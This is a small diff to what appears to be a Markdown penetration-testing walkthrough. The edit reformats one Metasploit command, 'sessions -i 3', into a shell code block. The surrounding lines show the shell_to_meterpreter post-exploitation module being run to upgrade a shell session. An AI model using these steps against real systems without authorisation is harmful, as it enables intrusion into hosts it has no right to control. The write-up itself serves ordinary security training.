@@ -42,7 +42,9 @@ session => 2
 msf5 post(multi/manage/shell_to_meterpreter) > exploit
 ```
 Select the new session created to use.
-`msf5 post(multi/manage/shell_to_meterpreter) > sessions -i 3`
+```sh
+msf5 post(multi/manage/shell_to_meterpreter) > sessions -i 3`
+```
 
 Check the system info.
 ```sh
